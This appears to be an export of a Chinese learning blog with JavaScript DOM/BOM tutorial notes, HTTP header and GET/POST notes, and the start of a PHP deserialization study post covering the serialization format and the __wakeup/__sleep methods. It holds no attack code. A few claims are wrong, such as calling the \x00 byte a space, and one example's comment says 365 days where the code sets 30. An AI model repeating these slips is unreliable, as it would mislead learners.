第一个参数是事件的类型 (如 “click” 或 “mousedown”)；第二个参数是事件触发后调用的函数；第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的
注意：事件不需要加”on”前缀
向元素添加事件句柄
&lt;script&gt;document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;, function()&#123;    alert(&quot;Hello World!&quot;);&#125;);&lt;/script&gt;

除了上述方法，也可以使用函数名，引用外部函数
document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;, myFunction);function myFunction() &#123;    alert (&quot;Hello World!&quot;);&#125;

addEventListener() 方法允许向同一个元素添加多个事件，且不会覆盖已存在的事件
可以向同个元素添加不同类型的事件
let x=document.getElementById(&quot;muBtn&quot;)x.addEventListener(&quot;click&quot;,showDate)x.addEventListener(&quot;mouseover&quot;,first);x.addEventListener(&quot;mouseout&quot;,second);function showDate()&#123;  let date=Date();  document.getElementById(&quot;demo&quot;).innerHTML+=date+&quot;&lt;br&gt;&quot;;&#125;function first()&#123;  document.getElementById(&quot;demo&quot;).innerHTML+=&quot;first&lt;br&gt;&quot;&#125;function second()&#123;  document.getElementById(&quot;demo&quot;).innerHTML+=&quot;second&lt;br&gt;&quot;&#125;

向window对象添加事件句柄
addEventListener() 方法允许你在 HTML DOM 对象添加事件监听， HTML DOM 对象如： HTML 元素, HTML 文档, window 对象。或者其他支持的事件对象如: xmlHttpRequest 对象
&lt;script&gt;//重置窗口大小的时候会触发&quot;resize&quot; 事件句柄window.addEventListener(&quot;resize&quot;, function()&#123;    document.getElementById(&quot;demo&quot;).innerHTML = Math.random();&#125;);&lt;/script&gt;

传递参数
当传递参数值时，使用”匿名函数”调用带参数的函数
let p1=5;let p2=4;document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;,function()&#123;  myFunction(p1,p2);&#125;);function myFunction(a,b)&#123;  var result=a*b;  document.getElementById(&quot;demo&quot;).innerHTML=result;&#125;

document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;,myFunction(p1, p2));错误原因：事件监听器中的函数应该是一个函数的引用，而不是一个函数的调用。因此，在添加事件监听器时，应该传递函数名而不是调用函数。myFunction(p1, p2) 是一个函数调用，而不是函数的引用。
事件冒泡或捕获
事件传递有两种方式：冒泡与捕获。
事件传递定义了元素事件触发的顺序。 如果你将  元素插入到  元素中，用户点击  元素, 哪个元素的 “click” 事件先被触发呢？
在 冒泡 中，内部元素的事件会先被触发，然后再触发外部元素，即：  元素的点击事件先触发，然后会触发  元素的点击事件。
在 捕获 中，外部元素的事件会先被触发，然后才会触发内部元素的事件，即：  元素的点击事件先触发 ，然后再触发  元素的点击事件。
addEventListener() 方法可以指定 “useCapture” 参数来设置传递类型：
addEventListener(event,function,useCapture);

默认值为 false, 即冒泡传递，当值为 true 时, 事件使用捕获传递。
&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;style&gt;div &#123;    background-color: coral;    border: 1px solid;    padding: 50px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;myDiv&quot;&gt;	&lt;p id=&quot;myP&quot;&gt;点击段落，我是冒泡。&lt;/p&gt;&lt;/div&gt;&lt;br&gt;&lt;div id=&quot;myDiv2&quot;&gt;	&lt;p id=&quot;myP2&quot;&gt;点击段落，我是捕获。 &lt;/p&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;myP&quot;).addEventListener(&quot;click&quot;, function() &#123;    alert(&quot;你点击了 P 元素!&quot;);&#125;, false);document.getElementById(&quot;myDiv&quot;).addEventListener(&quot;click&quot;, function() &#123;    alert(&quot; 你点击了 DIV 元素 !&quot;);&#125;, false);document.getElementById(&quot;myP2&quot;).addEventListener(&quot;click&quot;, function() &#123;    alert(&quot;你点击了 P2 元素!&quot;);&#125;, true);document.getElementById(&quot;myDiv2&quot;).addEventListener(&quot;click&quot;, function() &#123;    alert(&quot;你点击了 DIV2 元素 !&quot;);&#125;, true);&lt;/script&gt;&lt;/body&gt;

removeEventListener() 方法
removeEventListener() 方法移除由 addEventListener() 方法添加的事件句柄:
&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;薯条的测试&lt;/title&gt;  &lt;style&gt;    #myDIV &#123;      background-color: coral;      border: 1px solid;      padding: 50px;      color: white;    &#125;  &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;开始测试&lt;/h1&gt;&lt;div id=&quot;myDIV&quot;&gt; div 元素添加了 onmousemove 事件句柄，鼠标在桔红色的框内移动时会显示随机数。  &lt;p&gt;点击按钮移除 DIV 的事件句柄。&lt;/p&gt;  &lt;button onclick=&quot;removeHandler()&quot; id=&quot;myBtn&quot;&gt;点我&lt;/button&gt;&lt;/div&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;script&gt;  document.getElementById(&quot;myDIV&quot;).addEventListener(&quot;mousemove&quot;, myFunction);  function myFunction() &#123;    document.getElementById(&quot;demo&quot;).innerHTML = Math.random();  &#125;  function removeHandler() &#123;    document.getElementById(&quot;myDIV&quot;).removeEventListener(&quot;mousemove&quot;, myFunction);  &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;

DOM元素（节点）如何向文档中添加和移除元素
创建新的 HTML 元素 (节点) - appendChild()
&lt;div id=&quot;div1&quot;&gt;&lt;p id=&quot;p1&quot;&gt;这是一个段落。&lt;/p&gt;&lt;p id=&quot;p2&quot;&gt;这是另外一个段落。&lt;/p&gt;&lt;/div&gt;&lt;script&gt;var para = document.createElement(&quot;p&quot;);var node = document.createTextNode(&quot;这是一个新的段落。&quot;);para.appendChild(node);var element = document.getElementById(&quot;div1&quot;);element.appendChild(para);&lt;/script&gt;

解析：这行代码是用于创建  元素:var para = document.createElement(&quot;p&quot;);
为  元素创建一个新的文本节点：var node = document.createTextNode(&quot;这是一个新的段落。&quot;);
将文本节点添加到  元素中：para.appendChild(node);
最后，在一个已存在的元素中添加 p 元素。
查找已存在的元素：var element = document.getElementById(&quot;div1&quot;);
添加到已存在的元素中:element.appendChild(para);
创建新的 HTML 元素 (节点) - insertBefore()
 appendChild() 方法:它用于添加新元素到尾部
 insertBefore() 方法:将新元素添加到开始位置
HTML代码跟appendChild()方法里面的代码一致，js代码如下所示：var para = document.createElement(&quot;p&quot;);var node = document.createTextNode(&quot;这是一个新的段落。&quot;);para.appendChild(node);var element = document.getElementById(&quot;div1&quot;);var child = document.getElementById(&quot;p1&quot;);element.insertBefore(para, child);//新元素插到child元素之前

移除已存在的元素
要移除之前我们必须知道该元素的父元素
&lt;div id=&quot;div1&quot;&gt;&lt;p id=&quot;p1&quot;&gt;这是一个段落。&lt;/p&gt;&lt;p id=&quot;p2&quot;&gt;这是另外一个段落。&lt;/p&gt;&lt;/div&gt;&lt;script&gt;var parent = document.getElementById(&quot;div1&quot;);var child = document.getElementById(&quot;p1&quot;);parent.removeChild(child);parent.parentNode.removeChild(parent);&lt;/script&gt;

parent.parentNode.removeChild(parent);：parentNode 是一个 DOM 属性，它指向节点的父节点。在这个特定的代码中，parent 是一个通过 document.getElementById(&quot;div1&quot;) 获取到的 &lt;div&gt; 元素，因此 parent.parentNode 就是 &lt;div&gt; 元素的父节点
替换元素-replaceChild()
用 replaceChild() 方法来替换 HTML DOM 中的元素
&lt;script&gt;var para = document.createElement(&quot;p&quot;);var node = document.createTextNode(&quot;这是一个新的段落。&quot;);para.appendChild(node);var parent = document.getElementById(&quot;div1&quot;);var child = document.getElementById(&quot;p1&quot;);parent.replaceChild(para, child);&lt;/script&gt;

集合(Collection)getElementsByTagName() 方法返回 HTMLCollection 对象。
HTMLCollection 对象类似包含 HTML 元素的一个数组。
集合中的元素可以通过索引(以 0 为起始位置)来访问
&lt;p&gt;MNC&lt;/p&gt;&lt;p&gt;曼城&lt;/p&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;script&gt;  let myCollection=document.getElementsByTagName(&quot;p&quot;);//myCollection为HTMLCollection 对象  let a=myCollection[1].innerHTML; // 使用 textContent 获取文本内容  document.getElementById(&quot;demo&quot;).innerHTML=`第二个段落是$&#123;a&#125;`;&lt;/script&gt;

HTMLCollection 对象的 length 属性定义了集合中元素的数量，例子如下：
在上述js代码后面再加上：document.getElementById(&quot;demo&quot;).innerHTML = &quot;文档包含&quot; + myCollection.length + &quot; 个段落。&quot;;

集合 length 属性常用于遍历集合中的元素
var myCollection = document.getElementsByTagName(&quot;p&quot;);var i;for (i = 0; i &lt; myCollection.length; i++) &#123;    myCollection[i].style.backgroundColor = &quot;red&quot;;&#125;

NodeList对象NodeList 对象是一个从文档中获取的节点列表 (集合) ，类似 HTMLCollection 对象，用法也与它差不多
所有浏览器的 childNodes 属性返回的是 NodeList 对象。
大部分浏览器的 querySelectorAll() 返回 NodeList 对象。
var myNodelist = document.querySelectorAll(&quot;p&quot;);

浏览器对象模型 (BOM)window所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员。
全局变量是 window 对象的属性。
全局函数是 window 对象的方法。
window尺寸
有三种方法能够确定浏览器窗口的尺寸。
对于Internet Explorer、Chrome、Firefox、Opera 以及 Safari：

window.innerHeight - 浏览器窗口的内部高度(包括滚动条)
window.innerWidth - 浏览器窗口的内部宽度(包括滚动条)

对于 Internet Explorer 8、7、6、5：

document.documentElement.clientHeight
document.documentElement.clientWidth

或者

document.body.clientHeight
document.body.clientWidth

&lt;script&gt;  let w=window.innerWidth        ||document.documentElement.clientWidth        ||document.body.clientWidth;  let h=window.innerHeight        ||document.documentElement.clientHeight        ||document.body.clientHeight;  let x=document.getElementById(&quot;demo&quot;);  x.innerHTML=`浏览器宽度为$&#123;w&#125;，高度为$&#123;h&#125;。`&lt;/script&gt;

window的其他一些方法：

window.open() - 打开新窗口
window.close() - 关闭当前窗口
window.moveTo() - 移动当前窗口
window.resizeTo() - 调整当前窗口的尺寸

Window Screenwindow.screen 对象包含有关用户屏幕的信息
window.screen对象在编写时可以不使用 window 这个前缀。
一些属性：

screen.availWidth - 返回访问者屏幕的宽度，以像素计，减去界面特性，比如窗口任务栏document.write(&quot;可用宽度: &quot; + screen.availWidth);
screen.availHeight - 返回访问者屏幕的高度，以像素计，减去界面特性，比如窗口任务栏 document.write(&quot;可用高度: &quot; + screen.availHeight);

Window Locationwindow.location 对象在编写时可不使用 window 这个前缀。 一些例子：
一些实例:

location.hostname 返回 web 主机的域名
location.pathname 返回当前页面的路径和文件名:document.write(location.pathname);
location.port 返回 web 主机的端口 （80 或 443）
location.protocol 返回所使用的 web 协议（http: 或 https:）

location.href 属性返回当前页面的 URL。实例如下：
document.write(location.href);//返回完整的URL

location.assign() 方法加载新的文档。实例如下：
&lt;script&gt;function newDoc()&#123;    window.location.assign(&quot;https://www.runoob.com&quot;)&#125;&lt;/script&gt;&lt;input type=&quot;button&quot; value=&quot;加载新文档&quot; onclick=&quot;newDoc()&quot;&gt;

Window historywindow.history对象在编写时可不使用 window 这个前缀。
一些方法：

history.back() - 与在浏览器点击后退按钮相同

&lt;script&gt;function goBack()&#123;    window.history.back()&#125;&lt;/script&gt;&lt;input type=&quot;button&quot; value=&quot;Back&quot; onclick=&quot;goBack()&quot;&gt;


history.forward() - 与在浏览器中点击向前按钮相同：起作用的前提是你处于的不是最新界面

Window Navigatorwindow.navigator 对象包含有关访问者浏览器的信息，下面实例里面有几个弃用的，可以找到更好的替代
&lt;div id=&quot;example&quot;&gt;&lt;/div&gt;&lt;script&gt;txt = &quot;&lt;p&gt;浏览器代号: &quot; + navigator.appCodeName + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;浏览器名称: &quot; + navigator.appName + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;浏览器版本: &quot; + navigator.appVersion + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;启用Cookies: &quot; + navigator.cookieEnabled + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;硬件平台: &quot; + navigator.platform + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;用户代理: &quot; + navigator.userAgent + &quot;&lt;/p&gt;&quot;;txt+= &quot;&lt;p&gt;用户代理语言: &quot; + navigator.language + &quot;&lt;/p&gt;&quot;;document.getElementById(&quot;example&quot;).innerHTML=txt;&lt;/script&gt;

弹窗弹窗使用 反斜杠 + “n”(\n) 来设置换行：alert(&quot;Hello\nHow are you?&quot;);
警告窗
警告框经常用于确保用户可以得到某些信息。 alert(&quot;你好，我是一个警告框！&quot;);
当警告框出现后，用户需要点击确定按钮才能继续进行操作。
确认窗
确认框通常用于验证是否接受用户操作：window.confirm(&quot;sometext&quot;);wnidow.可加可不加
当确认框弹出时，用户可以点击 “确认” 或者 “取消” 来确定用户操作。
当你点击 “确认”, 确认框返回 true， 如果点击 “取消”, 确认框返回 false
&lt;script&gt;function myFunction()&#123;	var x;	var r=confirm(&quot;按下按钮!&quot;);	if (r==true)&#123;		x=&quot;你按下了\&quot;确定\&quot;按钮!&quot;;	&#125;	else&#123;		x=&quot;你按下了\&quot;取消\&quot;按钮!&quot;;	&#125;	document.getElementById(&quot;demo&quot;).innerHTML=x;&#125;&lt;/script&gt;

提示框
提示框经常用于提示用户在进入页面前输入某个值：window.prompt(&quot;sometext&quot;,&quot;defaultvalue&quot;);后面那个相当于预填充的值
当提示框出现后，用户需要输入某个值，然后点击确认或取消按钮才能继续操纵。
如果用户点击确认，那么返回值为输入的值。如果用户点击取消，那么返回值为 null。
&lt;script&gt;function myFunction()&#123;	var x;	var person=prompt(&quot;请输入你的名字&quot;,&quot;Harry Potter&quot;);	if (person!=null &amp;&amp; person!=&quot;&quot;)&#123;	    x=&quot;你好 &quot; + person + &quot;! 今天感觉如何?&quot;;	    document.getElementById(&quot;demo&quot;).innerHTML=x;	&#125;&#125;&lt;/script&gt;

计时事件通过使用 JavaScript，我们有能力做到在一个设定的时间间隔之后来执行代码，而不是在函数被调用后立即执行。我们称之为计时事件。
setInterval() 方法
setInterval() 间隔指定的毫秒数不停地执行指定的代码：setInterval(&quot;javascript function&quot;,milliseconds);
setInterval() 第一个参数是函数（function），第二个参数间隔的毫秒数
//3秒弹出一个&quot;hello&quot;警告窗function myFunction()&#123;	setInterval(function()&#123;alert(&quot;Hello&quot;)&#125;,3000);&#125;//显示时钟，并停止&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;button onclick=&quot;myStopFunction()&quot;&gt;停止&lt;/button&gt;&lt;script&gt;var myVar=setInterval(function()&#123;myTimer()&#125;,1000);function myTimer()&#123;	var d=new Date();	var t=d.toLocaleTimeString();	document.getElementById(&quot;demo&quot;).innerHTML=t;&#125;function myStopFunction()&#123;	clearInterval(myVar);&#125;&lt;/script&gt;

clearInterval() 方法用于停止 setInterval() 方法执行的函数代码：clearInterval(intervalVariable)
要使用 clearInterval() 方法, 在创建计时方法时你必须使用全局变量myVar=setInterval(&quot;javascriptfunction&quot;,milliseconds);
然后你可以使用 clearInterval() 方法来停止执行：clearInterval(myVar);
setTimeout()方法
具体知识在上面的“异步编程”一节中
&lt;body&gt;&lt;script&gt;function timedText()&#123;	var x=document.getElementById(&#x27;txt&#x27;);	var t1=setTimeout(function()&#123;x.value=&quot;2 秒&quot;&#125;,2000);	var t2=setTimeout(function()&#123;x.value=&quot;4 秒&quot;&#125;,4000);	var t3=setTimeout(function()&#123;x.value=&quot;6 秒&quot;&#125;,6000);&#125;&lt;/script&gt;&lt;form&gt;&lt;input type=&quot;button&quot; value=&quot;显示文本时间!&quot; onclick=&quot;timedText()&quot; /&gt;&lt;input type=&quot;text&quot; id=&quot;txt&quot; /&gt;&lt;/form&gt;&lt;p&gt;点击上面的按钮，输出的文本将告诉你2秒，4秒，6秒已经过去了。&lt;/p&gt;&lt;/body&gt;

clearTimeout() 方法用于停止执行setTimeout()方法的函数代码
要使用clearTimeout() 方法, 你必须在创建超时方法中（setTimeout）使用全局变量:
CookieJavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。
创建cookie
JavaScript 中，创建 cookie 如下所示：
document.cookie=&quot;username=John Doe&quot;;
您还可以为 cookie 添加一个过期时间（以 UTC 或 GMT 时间）。默认情况下，cookie 在浏览器关闭时删除：
document.cookie=&quot;username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT&quot;;
您可以使用 path 参数告诉浏览器 cookie 的路径。默认情况下，cookie 属于当前页面。
document.cookie=&quot;username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/&quot;;
读取cookie
格式：var x = document.cookie;

document.cookie 将以字符串的方式返回所有的 cookie，类型格式： cookie1&#x3D;value; cookie2&#x3D;value; cookie3&#x3D;value;
修改cookie
在 JavaScript 中，修改 cookie 类似于创建 cookie，如下所示：
document.cookie=&quot;username=John Smith; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/&quot;;

旧的 cookie 将被覆盖。
删除cookie
删除 cookie 非常简单。您只需要设置 expires 参数为以前的时间即可，如下所示，设置为 Thu, 01 Jan 1970 00:00:00 GMT:
document.cookie = &quot;username=; expires=Thu, 01 Jan 1970 00:00:00 GMT&quot;;

注意，当您删除时不必指定 cookie 的值。
一个关于cookie的完整实例
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;head&gt;&lt;script&gt;function setCookie(cname,cvalue,exdays)&#123;	var d = new Date();	d.setTime(d.getTime()+(exdays*24*60*60*1000));//毫秒数	var expires = &quot;expires=&quot;+d.toGMTString();	document.cookie = cname+&quot;=&quot;+cvalue+&quot;; &quot;+expires;&#125;//cookie 的名称为 cname，cookie 的值为 cvalue，并设置了 cookie 的过期时间 expiresfunction getCookie(cname)&#123;//cookie 名的参数为 cname	var name = cname + &quot;=&quot;;//创建一个文本变量用于检索指定 cookie 	var ca = document.cookie.split(&#x27;;&#x27;);//使用分号来分割 document.cookie 字符串，并将分割后的字符串数组赋值给 ca	for(var i=0; i&lt;ca.length; i++) &#123;		var c = ca[i].trim();		if (c.indexOf(name)==0) &#123; return c.substring(name.length,c.length); &#125;	&#125;//循环 ca 数组 (i=0;i&lt;ca.length;i++)，然后读取数组中的每个值，并去除前后空格 (c=ca[i].trim())	return &quot;&quot;;&#125;//如果找到 cookie(c.indexOf(name) == 0)，返回 cookie 的值；没有找到 cookie, 返回 &quot;&quot;function checkCookie()&#123;	var user=getCookie(&quot;username&quot;);	if (user!=&quot;&quot;)&#123;		alert(&quot;欢迎 &quot; + user + &quot; 再次访问&quot;);	&#125;	else &#123;		user = prompt(&quot;请输入你的名字:&quot;,&quot;&quot;);  		if (user!=&quot;&quot; &amp;&amp; user!=null)&#123;    		setCookie(&quot;username&quot;,user,30);    	&#125;	&#125;&#125;如果设置了 cookie，将显示一个问候信息。如果没有设置 cookie，将会显示一个弹窗用于询问访问者的名字，并调用 setCookie 函数将访问者的名字存储 365 天&lt;/script&gt;&lt;/head&gt;&lt;body onload=&quot;checkCookie()&quot;&gt;&lt;/body&gt;&lt;/html&gt;

这里使用 substring() 方法获取从名称长度到字符串末尾的子字符串，即获取了指定名称的 cookie 的值，并将其返回。
其他网页上显示一个钟表
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;script&gt;function startTime()&#123;	var today=new Date();	var h=today.getHours();	var m=today.getMinutes();	var s=today.getSeconds();// 在小于10的数字前加一个‘0’	m=checkTime(m);	s=checkTime(s);	document.getElementById(&#x27;txt&#x27;).innerHTML=h+&quot;:&quot;+m+&quot;:&quot;+s;	t=setTimeout(function()&#123;startTime()&#125;,500);&#125;function checkTime(i)&#123;	if (i&lt;10)&#123;		i=&quot;0&quot; + i;	&#125;	return i;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=&quot;startTime()&quot;&gt;&lt;div id=&quot;txt&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;

不止以上这一种方法
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>http协议，GET以及POST</title>
    <url>/2023/10/24/http%E5%8D%8F%E8%AE%AE%EF%BC%8CGET%E4%BB%A5%E5%8F%8APOST/http%E5%8D%8F%E8%AE%AE%EF%BC%8CGET%E4%BB%A5%E5%8F%8APOST/</url>
    <content><![CDATA[[TOC]
http协议http报文格式http协议的请求原文和响应报文的结构基本相同，由三个部分组成：
1.起始行：描述请求或响应的基本信息
2.头部字段集合(header)：使用key-value形式更详细地说明报文
3.消息正文(entity)：实际传输的数据，它不一定是纯文本，可以是图片，视频等二进制数据


header（报头）header 的整体格式是键值对结构，每个键值对占一行，键和值之间使用 冒号+空格 进行分割
以下是几种常见的报头：
HostHOST 的值表示服务器主机的地址和端口（地址可以是域名，也可以是 IP；端口号可以省略或者手动指定）
Content-LengthContent-Length 表示 body 的数据长度，长度单位是字节
Content-TypeContent-Type 表示 body 的数据格式，以下介绍三种请求中的数据格式

User-Agent（简称 UA）User-Agent 表示浏览器或者操作系统的属性
例子：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/91.0.4472.77 Safari/537.36
在这其中Windows NT 10.0; Win64; x64 表示操作系统信息；AppleWebKit/537.36 (KHTML, like Gecko)Chrome/91.0.4472.77 Safari/537.36 表示浏览器信息
RefererReferer 表示这个页面是从哪个页面跳转过来的，这是一个很有用的字段
假设我用 bing 浏览器搜索蛋糕，会发现有的搜索结果带有广告字眼，这就相当于广告主在 bing 浏览器用来引流的，当该网站的点击次数越多，用户的成交量也就会上升，金主给浏览器的广告费也就增多。为了统计该广告在某一浏览器的点击次数，就可以通过 Referer 字段来查看。
我们可以对该 HTTP 请求进行抓包，其中 Referer 字段的值就是 bing 浏览器，即表面该网页是从 bing 浏览器跳转过来的

（注意： 如果直接在浏览器中输入 URL 或直接通过收藏夹访问页面时，是没有 Referer 的）
Cookie
Cookie 是浏览器提供的一种让程序员在本地存储数据的能力
*为什么需要 Cookie？
如果没有 Cookie，直接将要存储的数据保存在客户端浏览器所在的主机的硬盘上，那么就会出现很大的安全风险，比如当你不小心打开某个不安全的网站，该网站就可以在你的硬盘上写一个病毒程序，那么你的电脑就挂了！因此浏览器为了保证安全性，就禁止网页中的代码访问主机的硬盘（无法在 JS 中读写文件），因此也就失去了持久化存储的能力，故 Cookie 就很重要！
*Cookie 里面存的是什么？
Cookie 中存储了一个字符串，是键值对结构的，键值对之间使用 ;分割，键和值之间使用 &#x3D; 分割
*Cookie 来自哪里，如何往 Cookie 中存储数据？
Cookie 这个数据可能是客户端（网页）自行通过 JS 写入的，也可能来自于服务器在 HTTP 响应的 header 中通过 Set-Cookie 字段给浏览器返回数据。
Cookie 在浏览器这边是按照域名维度来存储的，例如我们打开 CSDN 的首页，点击网址栏左边的一把小锁就能找到 Cookie，我们就可以看到打开这个网页时，系统按照不同域名设置了 Cookie

每一组都是中都存储了 Cookie，我们点开 csdn.net 这组的 Cookie 就能看到具体的数据

通过抓包工具，我们也能得到 Cookie 的数据，可以发现，上述中的键和值都是存在的，例如 uuid_tt_dd
*Cookie 要到哪里去？
Cookie 字段会在后续的请求中，把浏览器本地存储的这些键值对再发送回服务器

例子：保持客户端的登录状态

*Cookie 的缺陷：
每次请求都要把该域名下所有的 Cookie 通过 HTTP 请求传给服务器，因此 Cookie 的存储容量是有限的
xff
是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。
格式：X-Forwarded-For:IP
GETGET 是最常用的 HTTP 方法，常用于获取服务器上的某个资源。以下几种方式都会触发 GET 方法的请求
1.在浏览器中直接输入 URL 回车或点击浏览器收藏夹中的链接，此时浏览器就会发送出一个 GET 请求。2.HTML 中的 link、img、script 等标签的属性中放的 URL，浏览器也会构造出 HTTP GET 请求3.使用 Javascript 重点 ajax，也能构造出 HTTP GET 请求4.各种编程语言（只要能够访问网络），就都能够构造出 HTTP GER 请求
POSTPOST 方法也是一种常见的方法，多用于提交用户输入的数据给服务器（如登录页面）。以下几种方法都会触发 POST 方法的请求
1.通过 HTML 中的 form 标签可以构造 POST 请求2.使用 JavaScript 的 ajax 可以构造 POST 请求
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化学习</title>
    <url>/2024/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0_max/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[基础理解PHP序列化：serialize()
序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。
而PHP反序列化：unserialize()
反序列化是将字符串转换成变量或对象的过程
通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。这样说可能还不是很具体，举个列子比如你网购买一个架子，发货为节省成本，是拆开给你发过去，到你手上，然后给你说明书让你组装，拆开给你这个过程可以说是序列化，你组装的过程就是反序列化
序列化首先每一个序列化后的小段都由; 隔开, 使用&#123;&#125;表示层级关系



数据类型
提示符
格式



字符串
s
s:长度:”内容”


已转义字符串
S
s:长度:”转义后的内容”


整数
i
i:数值


布尔值
b
b:1 &#x3D;&gt; true &#x2F; b:0 &#x3D;&gt; false


空值
N
N;


数组
a
a:大小:{键序列段;值序列段;&lt;重复多次&gt;}


对象
O
O:类型名长度:”类型名称”:成员数:{成员名称序列段;成员值序列段:}


引用
R
R:反序列化变量的序号, 从1开始


例子如下：
class Kengwang&#123;    public $name = &quot;kengwang&quot;;    public $age = 18;    public $sex = true;    public $route = LearningRoute::Web;    public $tag = array(&quot;dino&quot;, &quot;cdut&quot;, &quot;chengdu&quot;);    public $girlFriend = null;    private $pants = &quot;red&quot;; // not true&#125;

序列化后如下所示（下面经过整理，一般都为一行）：
O:8:&quot;Kengwang&quot;:7:&#123; // 定义了一个对象 [O], 对象名称长度为 [8], 对象类型数为 [7]    s:4:&quot;name&quot;;s:8:&quot;kengwang&quot;; // 第一个字段名称是[4]个长度的&quot;name&quot;, 值为长度为[8]的字符串([s]) &quot;kengwang&quot;     s:3:&quot;age&quot;;i:18; // 第二个字段名称是长度为[3]的&quot;age&quot;, 值为整数型([i]): 18    s:3:&quot;sex&quot;;b:1; // 第三个字段名称是长度为[3]的&quot;sex&quot;, 值为布尔型([b]): 1 -&gt; true    s:5:&quot;route&quot;;E:17:&quot;LearningRoute:Web&quot;; // 第四个字段名称是长度为[5]的&quot;route&quot;, 值为枚举类型([E]), 枚举值长度为 [17], 值为 &quot;...&quot;:    s:3:&quot;tag&quot;;a:3:&#123; // 长度为 [3] 的数组([a])    	i:0;s:4:&quot;dino&quot;; // 第[0]个元素    	i:1;s:4:&quot;cdut&quot;;    	i:2;s:7:&quot;chengdu&quot;;	&#125;	s:10:&quot;girlFriend&quot;;N; // 字段 &quot;girlFriend&quot; 为 NULL	s:15:&quot; Kengwang pants&quot;;s:3:&quot;red&quot;; // 私有字段名称为 类型名 字段名, 其中类型名用 NULL 字符包裹&#125;

关于非公有字段名称(\x00其实就是空格）:

private 使用: 私有的类的名称 (考虑到继承的情况) 和字段名组合 \x00类名称\x00字段名
protected 使用: * 和字段名组合 \x00*\x00字段名

魔术方法__construct（笔记php有详细解释）构造函数, 在对应对象实例化时自动被调用. 子类中的构造函数不会隐式调用父类的构造函数
__wakeup与 sleep () 方法相比，wakeup () 方法通常用于反序列化操作，例如重建数据库连接或执行其他初始化操作。
&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;    public function __sleep() &#123;        echo &quot;It is called when the serialize() method is called outside the class.&lt;br&gt;&quot;;        $this-&gt;name = base64_encode($this-&gt;name);        return array(&#x27;name&#x27;, &#x27;age&#x27;); //它必须返回一个值，该值的元素是返回的属性的名称    &#125;    public function __wakeup() &#123;        echo &quot;It is called when the unserialize() method is called outside the class.&lt;br&gt;&quot;;        $this-&gt;name = 2;        $this-&gt;sex = &#x27;Male&#x27;;        // There is no need to return an array here.    &#125;&#125;$person = new Person(&#x27;John&#x27;);var_dump(serialize($person));//var_dump():以易于阅读的方式显示变量的详细信息，包括类型、长度和值var_dump(unserialize(serialize($person)));代码运行结果如下：It is called when the serialize() method is called outside the class.string(58) &quot;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;&quot;It is called when the unserialize() method is called outside the class.object(Person)#2 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;Male&quot; [&quot;name&quot;]=&gt; int(2) [&quot;age&quot;]=&gt; int(25) &#125;

__sleepserialize () 方法将检查类中是否有魔术方法__sleep ()。如果存在，将首先调用该方法，然后执行序列化操作。
__sleep () 方法通常用于指定保存数据之前需要序列化的属性。如果有一些非常大的对象不需要全部保存，那么您会发现此功能非常有用。
